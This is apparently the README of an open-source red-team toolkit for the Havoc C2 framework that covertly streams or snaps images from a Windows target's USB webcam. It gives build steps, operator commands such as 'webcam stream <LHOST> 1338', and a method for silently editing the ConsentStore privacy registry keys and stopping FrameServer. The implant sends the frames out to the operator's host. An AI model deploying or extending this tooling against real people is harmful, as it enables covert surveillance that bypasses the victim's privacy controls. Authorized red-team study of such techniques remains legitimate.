# uvc-bof

Havoc-compatible BOFs for a **USB UVC webcam**: live MJPG stream to an operator window, one-shot JPEG snap, and a privacy/Frame Server check.

Implant connects **out** over TCP (same pattern as HiddenDesktop). Protocol:

```
WCST | u32le size | jpeg | u32le size | jpeg | …
```

Default listen port **1338**. Authorized lab / red-team use only.

## Build

```bash
sudo apt install -y mingw-w64 python3 python3-pil python3-pil.imagetk
git clone https://github.com/DonMorpheus/uvc-bof.git
cd uvc-bof
make
```

Artifacts in `ObjectFiles/`:

| file | what |
|------|------|
| `WebcamStream.{x64,x86}.o` | live MJPG (KS UVC native 1080p passthrough, MF/VFW fallback) |
| `WebcamPrep.{x64,x86}.o` | `checkin` / `on` / `off` (registry + FrameServer, camera stays closed) |
| `WebcamBOF.{x64,x86}.o` | disk JPEG snap (CodeXTF2) |

## Havoc

Script Manager → load `uvc.py`. Interact:

```
help webcam
webcam listen 1338
webcam checkin
webcam on
webcam stream <LHOST> 1338
webcam off
webcam snap C:\Users\Public\webcam.jpg
```

Aliases: `webcam-listen`, `webcam-stream`, `webcam-checkin`, `webcam-on`, `webcam-off`.

Viewer:

```bash
python3 webcam-view.py --port 1338
```

`webcam listen` starts that window on `DISPLAY=:0` when the operator is on Linux.

## Stream path

1. Privacy **Allow** for desktop apps (`webcam on` writes ConsentStore + DeviceAccess).
2. `EnableFrameServerMode` / `EnableFrameServerModeWin32` = 0, stop `FrameServer` (exclusive lock `0xc00d3704`).
3. BOF opens **KS UVC** (`MI_00`) and sets native **MJPG** — no HW MJPEG MFT.
4. JPEG frames go to the Kali window. Close the window to stop.

HRESULT crib:

| HRESULT | meaning |
|---------|---------|
| `0xc00d3704` | exclusive / Frame Server |
| `0xc00d36e6` | RGB32 ATTRIBUTENOTFOUND (leftover MJPG attrs) |
| `0xc00d3ea2` | ReadSample died after a run of frames |

`webcam-off` deletes the keys this kit set and starts FrameServer again (HKLM is machine-wide).

`webcam on` does **not** reset a phantom USB device — replug or PnP restart if the cam is `CM_PROB_PHANTOM`.

## License

MIT © 2026 DonMorpheus. Snap objects: [CodeXTF2/WebcamBOF](https://github.com/CodeXTF2/WebcamBOF). See `LICENSE` and `CREDITS.md`.
